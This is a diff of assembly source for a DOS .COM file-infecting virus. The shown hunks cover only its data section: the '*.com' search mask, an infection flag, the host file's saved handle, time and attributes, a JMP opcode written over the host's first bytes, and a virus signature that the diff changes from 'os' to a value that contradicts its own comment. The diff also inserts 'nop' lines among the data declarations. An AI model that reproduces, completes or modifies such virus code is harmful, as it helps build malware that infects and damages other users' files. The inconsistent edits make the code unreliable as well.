@@ -24,8 +24,10 @@ finish db "finish !!!",0
 newDTA db "create new DTA..",0
 MASKE_COM    db  "*.com",0; File search mask
 firstfile dw 0h; is it the first file to infucted ??
-DTA      db 128 dup(?) ;buffer to store the DTA 
-counter dw  0019H;counter value store here count the int 8  
+DTA      db 128 dup(?) ;buffer to store the DTA   
+nop
+counter dw 0000H;counter value store here count the int 8
+nop
 _DX_DS dw 2 dup (?) ;DS:DX is stored here, first DX, then DS
 wHostFileHandle dw ? ;handle of the host file
 wHostTime dw ? ; here save the file time last change
@@ -34,10 +36,10 @@ wHostAttributes dw ? ;here save the file Attributes
 ;------------------------- DON'T SEPERATE -------------------------
 HostBytesNew db 0E9h ;opcode for a JMP instruction --> Jump near, relative, displacement relative to next instruction.
 wHostFileLength db 00,00 ;length of the host file (minus 3)
-VirusSignature db "os" ;signature of the virus need to be 6F73 in bytes 4 and 5 in host file .
+VirusSignature db "?'",0 ;signature of the virus need to be 6F73 in bytes 4 and 5 in host file .
 ;------------------------- DON'T SEPERATE -------------------------
 HostBytesOld db 3 dup(?);first three bytes of host file.
-HostSignature db 2 dup (?) ;the virus signature is stored in bytes
+HostSignature db 2 dup (?),0 ;the virus signature is stored in bytes
 ;4 and 5 of the host file. If the file is infected, these bytes
 ;will be equal to VirusSignature defined below
 ;-------------------------------------------------------------------
